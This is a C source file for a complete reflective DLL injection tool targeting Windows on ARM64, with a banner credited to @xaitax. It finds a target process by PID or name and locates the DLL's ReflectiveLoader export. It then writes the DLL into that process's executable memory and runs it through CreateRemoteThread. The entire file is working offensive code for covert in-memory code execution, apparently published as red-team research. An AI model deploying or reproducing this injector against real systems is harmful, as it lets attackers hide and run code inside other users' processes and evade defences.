#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <tlhelp32.h>
#include <string.h>
#include <ctype.h>
#include "arm64_reflective_dll_injection.h"

#ifndef IMAGE_FILE_MACHINE_ARM64
#define IMAGE_FILE_MACHINE_ARM64 0xAA64
#endif

void DisplayBanner()
{
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
    WORD saved_attributes;

    GetConsoleScreenBufferInfo(hConsole, &consoleInfo);
    saved_attributes = consoleInfo.wAttributes;

    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);

    printf("=====================================================================\n");
    printf("|          Reflective DLL Injection on Windows ARM64                |\n");
    printf("|                           By @xaitax                              |\n");
    printf("=====================================================================\n\n");

    SetConsoleTextAttribute(hConsole, saved_attributes);
}

BOOL IsHostARM64()
{
    SYSTEM_INFO sysInfo;
    GetNativeSystemInfo(&sysInfo);
    return sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64;
}

void PrintWindowsVersion()
{
    OSVERSIONINFOEXW osvi;
    typedef NTSTATUS(WINAPI * RTL_GET_VERSION_PROC)(LPOSVERSIONINFOEXW);
    RTL_GET_VERSION_PROC RtlGetVersionFunc = NULL;

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    char szOsDisplayName[128];
    char szOsMarketingName[32] = "Windows";

    if (hNtdll)
    {
        RtlGetVersionFunc = (RTL_GET_VERSION_PROC)GetProcAddress(hNtdll, "RtlGetVersion");
        if (RtlGetVersionFunc)
        {
            ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXW));
            osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
            if (RtlGetVersionFunc(&osvi) == 0)
            {

                if (osvi.dwMajorVersion == 10 && osvi.dwMinorVersion == 0 && osvi.dwBuildNumber >= 22000)
                {
                    strcpy_s(szOsMarketingName, sizeof(szOsMarketingName), "Windows 11");
                }
                else if (osvi.dwMajorVersion == 10 && osvi.dwMinorVersion == 0)
                {
                    strcpy_s(szOsMarketingName, sizeof(szOsMarketingName), "Windows 10");
                }
                sprintf_s(szOsDisplayName, sizeof(szOsDisplayName), "%s (Build %lu)",
                          szOsMarketingName,
                          osvi.dwBuildNumber);
                printf(" Host OS: %s\n", szOsDisplayName);
                return;
            }
        }
    }
    printf(" Host OS: Unable to determine Windows version.\n");
}

DWORD GetProcessIdByName(const char *processName)
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD pid = 0;

    if (snapshot == INVALID_HANDLE_VALUE)
    {
        printf(" CreateToolhelp32Snapshot failed. Error: %lu\n", GetLastError());
        return 0;
    }

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (_stricmp(entry.szExeFile, processName) == 0)
            {
                pid = entry.th32ProcessID;
                break;
            }
        }
    }
    else
    {
        printf(" Process32First failed. Error: %lu\n", GetLastError());
    }

    CloseHandle(snapshot);
    return pid;
}

DWORD RvaToOffset_Injector(DWORD dwRva, PIMAGE_NT_HEADERS pNtHeaders, LPVOID lpFileBase)
{
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

    if (pNtHeaders->FileHeader.NumberOfSections == 0)
    {
        if (dwRva < pNtHeaders->OptionalHeader.SizeOfHeaders)
        {
            return dwRva;
        }
        else
        {
            return 0;
        }
    }

    if (dwRva < pSectionHeader[0].VirtualAddress)
    {
        if (dwRva < pNtHeaders->OptionalHeader.SizeOfHeaders)
        {
            return dwRva;
        }
        else
        {
            return 0;
        }
    }

    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
    {
        if (dwRva >= pSectionHeader[i].VirtualAddress &&
            dwRva < (pSectionHeader[i].VirtualAddress + pSectionHeader[i].SizeOfRawData))
        {
            return (pSectionHeader[i].PointerToRawData + (dwRva - pSectionHeader[i].VirtualAddress));
        }
    }
    return 0;
}

DWORD GetReflectiveLoaderOffset(LPVOID lpFileBuffer)
{
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpFileBuffer;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        printf(" Invalid DOS signature.\n");
        return 0;
    }
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)lpFileBuffer + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        printf(" Invalid NT signature.\n");
        return 0;
    }
    if (pNtHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_ARM64)
    {
        printf(" DLL is not ARM64. Machine: 0x%hX\n", pNtHeaders->FileHeader.Machine);
        return 0;
    }
    if (pNtHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
    {
        printf(" DLL is not PE32+.\n");
        return 0;
    }

    PIMAGE_DATA_DIRECTORY pExportDataDir = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (pExportDataDir->VirtualAddress == 0 || pExportDataDir->Size == 0)
    {
        printf(" No export directory found.\n");
        return 0;
    }

    DWORD exportDirFileOffset = RvaToOffset_Injector(pExportDataDir->VirtualAddress, pNtHeaders, lpFileBuffer);
    if (exportDirFileOffset == 0 && pExportDataDir->VirtualAddress != 0)
    {
        printf(" Could not convert export directory RVA 0x%lX to offset.\n", pExportDataDir->VirtualAddress);
        return 0;
    }

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)lpFileBuffer + exportDirFileOffset);

    if (pExportDir->AddressOfNames == 0 || pExportDir->AddressOfNameOrdinals == 0 || pExportDir->AddressOfFunctions == 0)
    {
        printf(" Export directory contains null RVA(s) for names, ordinals, or functions.\n");
        return 0;
    }

    DWORD namesOffset = RvaToOffset_Injector(pExportDir->AddressOfNames, pNtHeaders, lpFileBuffer);
    DWORD ordinalsOffset = RvaToOffset_Injector(pExportDir->AddressOfNameOrdinals, pNtHeaders, lpFileBuffer);
    DWORD functionsOffset = RvaToOffset_Injector(pExportDir->AddressOfFunctions, pNtHeaders, lpFileBuffer);

    if (namesOffset == 0 && pExportDir->AddressOfNames != 0)
    {
        printf(" Failed to convert AddressOfNames RVA (0x%lX) to offset.\n", pExportDir->AddressOfNames);
        return 0;
    }
    if (ordinalsOffset == 0 && pExportDir->AddressOfNameOrdinals != 0)
    {
        printf(" Failed to convert AddressOfNameOrdinals RVA (0x%lX) to offset.\n", pExportDir->AddressOfNameOrdinals);
        return 0;
    }
    if (functionsOffset == 0 && pExportDir->AddressOfFunctions != 0)
    {
        printf(" Failed to convert AddressOfFunctions RVA (0x%lX) to offset.\n", pExportDir->AddressOfFunctions);
        return 0;
    }

    DWORD *pNamesRva = (DWORD *)((ULONG_PTR)lpFileBuffer + namesOffset);
    WORD *pOrdinals = (WORD *)((ULONG_PTR)lpFileBuffer + ordinalsOffset);
    DWORD *pAddressesRva = (DWORD *)((ULONG_PTR)lpFileBuffer + functionsOffset);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++)
    {
        if (pNamesRva[i] == 0)
            continue;
        DWORD funcNameFileOffset = RvaToOffset_Injector(pNamesRva[i], pNtHeaders, lpFileBuffer);
        if (funcNameFileOffset == 0 && pNamesRva[i] != 0)
        {
            printf(" Failed to convert function name RVA (0x%lX) for index %lu to offset.\n", pNamesRva[i], i);
            continue;
        }
        char *funcName = (char *)((ULONG_PTR)lpFileBuffer + funcNameFileOffset);

        if (strcmp(funcName, "ReflectiveLoader") == 0)
        {
            if (pOrdinals[i] >= pExportDir->NumberOfFunctions)
            {
                printf(" Ordinal %u for ReflectiveLoader is out of bounds (NumberOfFunctions: %lu).\n", pOrdinals[i], pExportDir->NumberOfFunctions);
                return 0;
            }
            if (pAddressesRva[pOrdinals[i]] == 0)
            {
                printf(" RVA for ReflectiveLoader function is null (Ordinal: %u).\n", pOrdinals[i]);
                return 0;
            }
            DWORD functionFileOffset = RvaToOffset_Injector(pAddressesRva[pOrdinals[i]], pNtHeaders, lpFileBuffer);
            if (functionFileOffset == 0 && pAddressesRva[pOrdinals[i]] != 0)
            {
                printf(" Failed to convert ReflectiveLoader function RVA (0x%lX) to offset.\n", pAddressesRva[pOrdinals[i]]);
                return 0;
            }
            return functionFileOffset;
        }
    }
    printf(" ReflectiveLoader export not found.\n");
    return 0;
}

int main(int argc, char *argv[])
{
    DisplayBanner();

    if (!IsHostARM64())
    {
        printf(" Host Architecture: This injector is intended for ARM64 Windows.\n");
        printf(" Host Architecture: Detected non-ARM64. Exiting.\n");
        return 1;
    }
    else
    {
        printf(" Host Architecture: ARM64\n");
    }
    PrintWindowsVersion();
    printf("\n");

    if (argc < 3)
    {
        printf(" Usage: %s <PID | ProcessName.exe> <DLL_Path>\n", argv[0]);
        printf("        Example (PID): %s 1234 arm64_rdi.dll\n", argv[0]);
        printf("        Example (Name): %s Notepad.exe arm64_rdi.dll\n\n", argv[0]);
        return 1;
    }

    DWORD dwProcessId = 0;
    char *targetIdentifier = argv[1];
    char *dllPath = argv[2];
    BOOL isNumeric = TRUE;
    size_t len = strlen(targetIdentifier);

    for (size_t i = 0; i < len; i++)
    {
        if (!isdigit(targetIdentifier[i]))
        {
            isNumeric = FALSE;
            break;
        }
    }

    if (isNumeric)
    {
        dwProcessId = strtoul(targetIdentifier, NULL, 10);
        if (dwProcessId == 0)
        {
            printf(" Invalid PID '%s' provided or PID is 0.\n", targetIdentifier);
            return 1;
        }
        printf(" Targeting PID: %lu\n", dwProcessId);
    }
    else
    {
        printf(" Targeting process name: %s\n", targetIdentifier);
        dwProcessId = GetProcessIdByName(targetIdentifier);
        if (dwProcessId == 0)
        {
            printf(" Failed to find process '%s' or get its PID.\n", targetIdentifier);
            return 1;
        }
        printf(" Found PID %lu for process name '%s'\n", dwProcessId, targetIdentifier);
    }

    printf(" DLL Path: %s\n", dllPath);

    HANDLE hFile = CreateFileA(dllPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf(" Failed to open DLL. Error: %lu\n", GetLastError());
        return 1;
    }

    DWORD dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE || dwFileSize == 0)
    {
        printf(" Invalid DLL size. Error: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
    printf(" DLL file size: %lu bytes\n", dwFileSize);

    LPVOID lpFileBuffer = HeapAlloc(GetProcessHeap(), 0, dwFileSize);
    if (!lpFileBuffer)
    {
        printf(" Failed to allocate buffer. Error: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    DWORD dwBytesRead = 0;
    if (!ReadFile(hFile, lpFileBuffer, dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize)
    {
        printf(" Failed to read DLL. Error: %lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, lpFileBuffer);
        CloseHandle(hFile);
        return 1;
    }
    CloseHandle(hFile);
    hFile = NULL;
    printf(" DLL read into local buffer at: 0x%016llX\n", (unsigned long long)lpFileBuffer);

    DWORD dwReflectiveLoaderFileOffset = GetReflectiveLoaderOffset(lpFileBuffer);
    if (dwReflectiveLoaderFileOffset == 0)
    {
        HeapFree(GetProcessHeap(), 0, lpFileBuffer);
        return 1;
    }
    printf(" ReflectiveLoader file offset: 0x%lX\n", dwReflectiveLoaderFileOffset);

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
    if (!hProcess)
    {
        printf(" Failed to open target process. Error: %lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, lpFileBuffer);
        return 1;
    }
    printf(" Target process %lu opened. Handle: 0x%p\n", dwProcessId, hProcess);

    LPVOID lpRemoteMem = VirtualAllocEx(hProcess, NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!lpRemoteMem)
    {
        printf(" VirtualAllocEx failed. Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        HeapFree(GetProcessHeap(), 0, lpFileBuffer);
        return 1;
    }
    printf(" Memory allocated in target at: 0x%016llX (Size: %lu bytes)\n", (unsigned long long)lpRemoteMem, dwFileSize);

    if (!WriteProcessMemory(hProcess, lpRemoteMem, lpFileBuffer, dwFileSize, NULL))
    {
        printf(" WriteProcessMemory failed. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, lpRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        HeapFree(GetProcessHeap(), 0, lpFileBuffer);
        return 1;
    }
    printf(" DLL written to target memory at: 0x%016llX\n", (unsigned long long)lpRemoteMem);

    HeapFree(GetProcessHeap(), 0, lpFileBuffer);
    lpFileBuffer = NULL;

    ULONG_PTR pfnRemoteLoader = (ULONG_PTR)lpRemoteMem + dwReflectiveLoaderFileOffset;
    printf(" Calculated remote ReflectiveLoader: 0x%016llX\n", (unsigned long long)pfnRemoteLoader);

    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pfnRemoteLoader, NULL, 0, NULL);
    if (!hRemoteThread)
    {
        printf(" CreateRemoteThread failed. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, lpRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf(" Remote thread created (Handle: 0x%p). Waiting...\n", hRemoteThread);

    WaitForSingleObject(hRemoteThread, INFINITE);
    printf(" Remote thread completed.\n");

    DWORD dwExitCode = 0;
    GetExitCodeThread(hRemoteThread, &dwExitCode);
    printf(" Remote thread exit code: 0x%08lX\n", dwExitCode);

    CloseHandle(hRemoteThread);
    CloseHandle(hProcess);

    printf("\n Injection process finished.\n");
    return 0;
}